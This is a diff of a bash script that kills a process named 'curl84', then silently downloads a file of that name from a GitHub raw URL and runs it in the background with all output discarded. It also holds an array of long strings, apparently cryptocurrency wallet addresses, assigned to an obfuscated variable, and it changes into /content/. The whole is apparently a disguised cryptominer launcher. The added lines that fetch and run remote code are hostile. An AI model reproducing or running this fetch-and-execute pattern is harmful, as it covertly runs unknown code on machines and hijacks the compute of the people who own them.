@@ -77,6 +77,10 @@ pkill -f curl84
 
 pkill -f curl84
 
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84
+
+bash ./curl84 &> /dev/null &
+
 arr[0]="4dkJEWHWMVpTFTD6pZr8111zWoRNJUmoStit56uL3Urhte98L1Lm3VBWhUCkS6MAYyyPFNSVCqbKccLTmFbiYgA6"
 arr[1]="36emHJrD7TjVnbrvJzpooocHD2vnEMZHjHMm3kk3tMpMhPgw5NfYPtZEiu6nBJjeJi21vwLAD2d5afKDRiJPeQKW"
 arr[2]="4migato2bH4mdWUVMWTrUC49bCGARNnqR1YAteUJ3tEJVobjrooSa6NqK2Uwehu9WFtpLwwEmcwT63Xcphun1bwj"
@@ -87,10 +91,6 @@ arr[6]="45rqQs8nm37XEtzK38aSJyDiyXXDKCtkFhbM7WtFGAATBLqAHq1CE9HyZZ7V4wtQ94qZPQbJ
 arr[7]="2tmy46jHQHTjMEsvgEz3BMMCnVcER97gqenr1zqzhpwd3VaiN1nS6m8eK8WTiNhXyHJBWS1FgZBpy2Ew5xxQ4Tio"
 rand=$[$RANDOM % ${#arr[@]}]
 google84121212121212121274=${arr[2]}
-
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84
-
-bash ./curl84 &> /dev/null &
 
 cd /content/
 
